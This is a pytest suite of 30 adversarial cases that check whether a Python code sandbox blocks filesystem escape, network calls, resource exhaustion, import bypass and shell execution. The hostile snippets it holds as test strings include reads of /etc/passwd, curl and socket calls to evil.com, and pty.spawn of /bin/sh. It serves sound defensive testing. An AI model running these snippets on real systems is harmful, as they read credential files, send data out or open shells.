"""
CA2 — Adversarial sandbox test suite (N=30).

Tests the sandbox boundary of server/code_executor.py against 5 attack categories
(6 tests each).  Every test asserts that is_safe() returns False OR that
sandbox_exec() raises SecurityError.  No test should allow malicious code to run.

Categories
----------
1. Filesystem Escape      (ADV-FS-01 … ADV-FS-06)
2. Network Requests       (ADV-NET-01 … ADV-NET-06)
3. Resource Exhaustion    (ADV-RES-01 … ADV-RES-06)
4. Import Bypass          (ADV-IMP-01 … ADV-IMP-06)
5. System Call / RCE      (ADV-SYS-01 … ADV-SYS-06)

Running
-------
    pytest tests/test_sandbox_adversarial.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from server.code_executor import SecurityError, is_safe, sandbox_exec


def _blocked(code: str) -> bool:
    """Return True if is_safe() rejects the code."""
    ok, _ = is_safe(code)
    return not ok


# ── Category 1: Filesystem Escape ────────────────────────────────────────────


class TestFilesystemEscape:
    """ADV-FS: All attempts to read/write outside SANDBOX_CWD must be blocked."""

    def test_adv_fs_01_absolute_path_open_read(self):
        """ADV-FS-01: open() with absolute POSIX path — text scan + AST path check."""
        assert _blocked("open('/etc/passwd', 'r')")

    def test_adv_fs_02_absolute_path_open_write(self):
        """ADV-FS-02: open() writing to absolute path (ADV-02 original case)."""
        assert _blocked("open('/etc/passwd', 'w').write('hacked')")

    def test_adv_fs_03_windows_absolute_path(self):
        """ADV-FS-03: open() with Windows-style absolute path."""
        assert _blocked(r"open('C:\\Windows\\System32\\hosts', 'r')")

    def test_adv_fs_04_path_traversal_open(self):
        """ADV-FS-04: open() with '../' traversal sequence."""
        assert _blocked("open('../../../etc/shadow', 'r')")

    def test_adv_fs_05_os_chdir_escape(self):
        """ADV-FS-05: os.chdir() to leave SANDBOX_CWD."""
        assert _blocked("import os; os.chdir('/')")

    def test_adv_fs_06_pathlib_write_text(self):
        """ADV-FS-06: pathlib .write_text() bypass — no open() used."""
        assert _blocked("from pathlib import Path; Path('/tmp/evil').write_text('x')")


# ── Category 2: Network Requests ─────────────────────────────────────────────


class TestNetworkRequests:
    """ADV-NET: All outbound network operations must be blocked."""

    def test_adv_net_01_requests_get(self):
        """ADV-NET-01: requests.get() — blocked by BLOCKED_PATTERNS 'requests'."""
        assert _blocked("import requests; requests.get('http://evil.com')")

    def test_adv_net_02_urllib_urlopen(self):
        """ADV-NET-02: urllib.request.urlopen() — blocked by 'urllib' pattern."""
        assert _blocked("import urllib.request; urllib.request.urlopen('http://evil.com')")

    def test_adv_net_03_socket_connect(self):
        """ADV-NET-03: raw socket — blocked by 'socket' pattern."""
        assert _blocked("import socket; s = socket.socket(); s.connect(('evil.com', 80))")

    def test_adv_net_04_subprocess_curl(self):
        """ADV-NET-04: curl via subprocess — blocked by 'subprocess' pattern."""
        assert _blocked("import subprocess; subprocess.run(['curl', 'http://evil.com'])")

    def test_adv_net_05_httpx_get(self):
        """ADV-NET-05: httpx library — blocked by 'httpx' pattern."""
        assert _blocked("import httpx; httpx.get('http://evil.com')")

    def test_adv_net_06_dns_resolution(self):
        """ADV-NET-06: DNS lookup via socket.getaddrinfo — blocked by 'socket'."""
        assert _blocked("import socket; socket.getaddrinfo('evil.com', None)")


# ── Category 3: Resource Exhaustion ──────────────────────────────────────────


class TestResourceExhaustion:
    """ADV-RES: Fork bomb / memory bomb / timeout evasion must be blocked or caught."""

    def test_adv_res_01_os_fork(self):
        """ADV-RES-01: os.fork() — blocked by 'os.fork' pattern."""
        assert _blocked("import os; os.fork()")

    def test_adv_res_02_multiprocessing_spawn(self):
        """ADV-RES-02: multiprocessing.Process — blocked by 'multiprocessing' pattern."""
        assert _blocked("import multiprocessing; multiprocessing.Process(target=lambda: None).start()")

    def test_adv_res_03_infinite_loop_timeout(self):
        """ADV-RES-03: infinite while loop — caught at runtime by 2s timeout."""
        result = sandbox_exec("while True: pass", timeout=2)
        assert not result.success
        assert result.duration_sec >= 2.0

    def test_adv_res_04_memory_bomb_blocked_by_timeout(self):
        """ADV-RES-04: list memory bomb — blocked by timeout (OOM kill)."""
        result = sandbox_exec("x = [0] * (10 ** 8)", timeout=3)
        # Either OOM-killed (success=False) or completes within 3s (acceptable)
        # The key assertion: duration must not exceed timeout by more than 1s
        assert result.duration_sec <= 4.0

    def test_adv_res_05_signal_handler_blocked(self):
        """ADV-RES-05: signal module to bypass timeout — blocked by 'signal.' pattern."""
        assert _blocked("import signal; signal.alarm(0)")

    def test_adv_res_06_resource_limits_blocked(self):
        """ADV-RES-06: resource.setrlimit to bypass limits — blocked by 'resource.' pattern."""
        assert _blocked("import resource; resource.setrlimit(resource.RLIMIT_CPU, (0, 0))")


# ── Category 4: Import Bypass ─────────────────────────────────────────────────


class TestImportBypass:
    """ADV-IMP: All attempts to import disallowed modules must be blocked."""

    def test_adv_imp_01_dunder_import(self):
        """ADV-IMP-01: __import__('os') — blocked by '__import__' pattern."""
        assert _blocked("__import__('os').system('ls')")

    def test_adv_imp_02_importlib(self):
        """ADV-IMP-02: importlib.import_module('os') — blocked by 'importlib'."""
        assert _blocked("import importlib; importlib.import_module('os')")

    def test_adv_imp_03_exec_compile(self):
        """ADV-IMP-03: exec(compile(...)) double-wrapping — blocked by 'exec(' + 'compile('."""
        assert _blocked("exec(compile('import os', '<string>', 'exec'))")

    def test_adv_imp_04_eval_import(self):
        """ADV-IMP-04: eval with import — blocked by 'eval(' pattern."""
        assert _blocked("eval(\"__import__('os').system('ls')\")")

    def test_adv_imp_05_getattr_builtins(self):
        """ADV-IMP-05: getattr(__builtins__, 'eval') — blocked by 'getattr(' + '__builtins__'."""
        assert _blocked("getattr(__builtins__, 'eval')('1+1')")

    def test_adv_imp_06_pickle_deserialization(self):
        """ADV-IMP-06: pickle.loads() deserialization RCE — blocked by 'pickle.' pattern."""
        assert _blocked("import pickle; pickle.loads(b'\\x80\\x04\\x95...')")


# ── Category 5: System Call / RCE ────────────────────────────────────────────


class TestSystemCallRCE:
    """ADV-SYS: Direct OS / C-level code execution must be blocked."""

    def test_adv_sys_01_os_system(self):
        """ADV-SYS-01: os.system() — blocked by 'os.system' pattern."""
        assert _blocked("import os; os.system('whoami')")

    def test_adv_sys_02_subprocess_run(self):
        """ADV-SYS-02: subprocess.run() — blocked by 'subprocess' pattern."""
        assert _blocked("import subprocess; subprocess.run(['ls', '-la'])")

    def test_adv_sys_03_subprocess_shell_true(self):
        """ADV-SYS-03: subprocess with shell=True — blocked by 'subprocess' pattern."""
        assert _blocked("import subprocess; subprocess.Popen('ls', shell=True)")

    def test_adv_sys_04_pty_spawn(self):
        """ADV-SYS-04: pty.spawn() terminal — blocked by 'pty.' pattern."""
        assert _blocked("import pty; pty.spawn('/bin/sh')")

    def test_adv_sys_05_ctypes_libc(self):
        """ADV-SYS-05: ctypes.CDLL('libc').system() — blocked by 'ctypes.' pattern."""
        assert _blocked("import ctypes; ctypes.CDLL(None).system(b'ls')")

    def test_adv_sys_06_os_execv(self):
        """ADV-SYS-06: os.execv() process replacement — blocked by 'os.execv' pattern."""
        assert _blocked("import os; os.execv('/bin/sh', ['/bin/sh', '-c', 'ls'])")


# ── Regression: safe code must NOT be blocked ────────────────────────────────


class TestSafeCodeNotBlocked:
    """Verify that legitimate scientific code still passes after hardening."""

    def test_pandas_import_still_allowed(self):
        ok, reason = is_safe("import pandas as pd\ndf = pd.DataFrame({'a': [1,2,3]})")
        assert ok, f"pandas should be allowed: {reason}"

    def test_numpy_computation_still_allowed(self):
        ok, reason = is_safe("import numpy as np\nx = np.array([1,2,3])\nprint(x.mean())")
        assert ok, f"numpy should be allowed: {reason}"

    def test_json_import_still_allowed(self):
        ok, reason = is_safe("import json\nprint(json.dumps({'ok': True}))")
        assert ok, f"json should be allowed: {reason}"
